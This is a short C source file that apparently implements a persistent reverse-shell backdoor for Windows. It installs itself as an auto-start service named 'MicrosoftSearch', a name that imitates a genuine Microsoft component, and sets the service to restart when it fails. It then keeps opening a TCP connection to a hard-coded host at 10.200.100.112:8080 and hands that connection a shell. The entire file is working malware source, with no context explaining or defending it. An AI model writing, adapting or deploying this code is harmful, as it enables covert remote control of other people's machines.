#include "../wsbind.h"

#define AUTO "auto\0"
#define NAME "MicrosoftSearch\0"
#define SERVER "10.200.100.112"

void service_main(int** running)
{
    wsc_init();
    while(**running == 1)
    {
        SockData shell_sock = wsc_tcp_create(SERVER, 8080);
        wss_basic(shell_sock);
        wsc_close_sock(&shell_sock);
    }
}

int main(int argc, char **argv)
{
    if(argc == 2)
    {
        wsw_this_as_service(NAME, AUTO, TRUE, NULL);
        wsw_service_restart_on_fail(NAME, 10);
        return 0;
    }
    return wsw_service(NAME, 0, *service_main);
}